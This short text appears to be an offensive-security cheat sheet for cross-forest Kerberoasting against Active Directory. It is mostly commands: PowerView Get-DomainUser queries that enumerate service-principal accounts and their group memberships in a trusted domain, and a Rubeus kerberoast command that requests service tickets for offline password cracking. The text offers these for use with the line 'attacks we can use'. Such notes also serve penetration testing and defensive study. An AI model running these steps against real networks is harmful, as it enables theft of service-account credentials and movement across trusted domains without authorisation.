Below is some cross forest attack we can use, if we have access to a domain account we can have launch Cross forest trust attacks provided that the trust allows us to do it:

Cross Forest Kerberoasting:

Enumerating SPNs for other domain with PowerView:
```
Get-DomainUser -SPN -Domain <domainname> | select SamAccountName
```

Enumerating SPN Account privilege:
```
Get-DomainUser -Domain <domainname> -Identity <username> |select samaccountname,memberof
```

-Using Rubeus to get TGS Ticket cross forest:
```
.\Rubeus.exe kerberoast /domain:<domainname> /nowrap
```
